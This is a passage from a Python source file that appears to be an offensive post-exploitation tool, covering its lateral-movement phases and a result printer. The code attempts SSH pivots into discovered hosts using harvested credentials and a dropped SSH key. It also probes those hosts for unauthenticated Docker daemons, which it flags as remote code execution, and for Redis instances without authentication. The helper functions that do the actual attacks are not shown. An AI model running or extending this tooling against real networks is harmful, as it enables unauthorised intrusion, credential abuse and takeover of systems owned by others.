            if verbose:
                print(f"  {_Y}[lateral]{_RE} Could not write SSH key to target — password-only mode")

    # ── Phase 3: SSH Lateral Movement ──────────────────────────────────────
    if verbose:
        print(f"\n{_W}[lateral]{_RE} ── Phase 3: SSH Lateral Movement ────────────────")

    for lhost in hosts:
        if verbose:
            print(f"  {_B}[lateral]{_RE} SSH → {lhost.ip}")

        _attempt_ssh(base, endpoints, lhost, creds, key_dropped, timeout, verbose)

        if lhost.ssh_success:
            session_id = f"{lhost.ssh_technique}@{lhost.ip}"
            result.ssh_sessions.append(session_id)
            result.success = True
            if verbose:
                print(f"  {_G}[lateral]{_RE} ✓ SSH success on {lhost.ip} "
                      f"via {lhost.ssh_technique}")
                print(f"    {lhost.ssh_output[:200]}")

        # Short inter-host pause
        time.sleep(0.1)

    # ── Phase 4: Service Probing ────────────────────────────────────────────
    if verbose:
        print(f"\n{_W}[lateral]{_RE} ── Phase 4: Service Probing ─────────────────────")

    for lhost in hosts:
        if verbose:
            print(f"  {_B}[lateral]{_RE} Probing {lhost.ip} …")
        _probe_services(base, endpoints, lhost, creds, timeout, verbose)

        if lhost.docker_exposed:
            result.docker_hosts.append(lhost.ip)
            result.success = True
        if lhost.redis_noauth:
            result.redis_hosts.append(lhost.ip)
            result.success = True

    # ── Summary ─────────────────────────────────────────────────────────────
    result.success = result.success or any(h.ssh_success for h in hosts)

    docker_note = f"Docker exposed (unauthenticated): {', '.join(result.docker_hosts)}" if result.docker_hosts else ""
    redis_note  = f"Redis no-auth: {', '.join(result.redis_hosts)}" if result.redis_hosts else ""
    ssh_note    = f"SSH sessions: {', '.join(result.ssh_sessions)}" if result.ssh_sessions else "No SSH sessions established"

    result.notes.append(
        f"Hosts discovered: {result.total_hosts} | "
        f"SSH sessions: {len(result.ssh_sessions)} | "
        f"Credentials harvested: {len(creds)}"
    )
    if docker_note:
        result.notes.append(docker_note)
    if redis_note:
        result.notes.append(redis_note)
    result.notes.append(ssh_note)

    return result


# ─── Print helper ─────────────────────────────────────────────────────────────

def print_lateral(r: LateralResult) -> None:
    """
    Pretty-print a LateralResult to stdout with ANSI colour.
    """
    print(f"\n{_W}╔══════════════════════════════════════════════╗")
    print(f"║      Lateral Movement Results               ║")
    print(f"╚══════════════════════════════════════════════╝{_RE}")

    status_col = _G if r.success else _R
    status_str = "SUCCESS" if r.success else "NO PIVOT"
    print(f"  Status    : {status_col}{status_str}{_RE}")
    print(f"  Hosts     : {r.total_hosts} discovered")
    print(f"  SSH pivot : {len(r.ssh_sessions)} session(s)")
    print(f"  Docker    : {len(r.docker_hosts)} exposed host(s)")
    print(f"  Redis     : {len(r.redis_hosts)} no-auth host(s)")
    print(f"  SSH keys  : {r.extracted_keys if r.extracted_keys else 'none'}")

    if r.error:
        print(f"\n  {_R}Error{_RE}: {r.error}")

    if r.hosts_discovered:
        print(f"\n  {_W}── Discovered Hosts ─────────────────────────{_RE}")
        for h in r.hosts_discovered:
            icon  = f"{_G}●{_RE}" if h.ssh_success else f"{_Y}○{_RE}"
            ports = ", ".join(str(p) for p in sorted(h.open_ports)) if h.open_ports else "none scanned"
            print(f"  {icon} {_W}{h.ip}{_RE}  [{h.source}]  ports: {ports}")
            if h.ssh_success:
                print(f"      {_G}↳ SSH {h.ssh_technique}{_RE}: {h.ssh_output[:120].splitlines()[0] if h.ssh_output else ''}")
            for port, banner in sorted(h.services.items()):
                svc_col = _R if port in (2375, 2376) else (_Y if port == 6379 else _C)
                print(f"      {svc_col}[{port}]{_RE} {banner[:100]}")
            if h.docker_exposed:
                print(f"      {_R}⚠ Docker daemon EXPOSED (unauthenticated RCE){_RE}")
            if h.redis_noauth:
                print(f"      {_Y}⚠ Redis responds to PING without auth{_RE}")
            for note in h.notes:
                print(f"      · {note}")

    if r.ssh_sessions:
        print(f"\n  {_W}── Active SSH Pivots ─────────────────────────{_RE}")
        for s in r.ssh_sessions:
            print(f"    {_G}✓{_RE} {s}")

    if r.docker_hosts:
        print(f"\n  {_W}── Exposed Docker Hosts ─────────────────────{_RE}")
        for ip in r.docker_hosts:
            print(f"    {_R}⚠{_RE} http://{ip}:2375/  — unauthenticated API")

    if r.redis_hosts:
        print(f"\n  {_W}── Redis No-Auth Hosts ──────────────────────{_RE}")
        for ip in r.redis_hosts:
            print(f"    {_Y}⚠{_RE} {ip}:6379  — no authentication required")

    if r.notes:
        print(f"\n  {_W}── Notes ─────────────────────────────────────{_RE}")
        for note in r.notes:
            print(f"    · {note}")

    print()
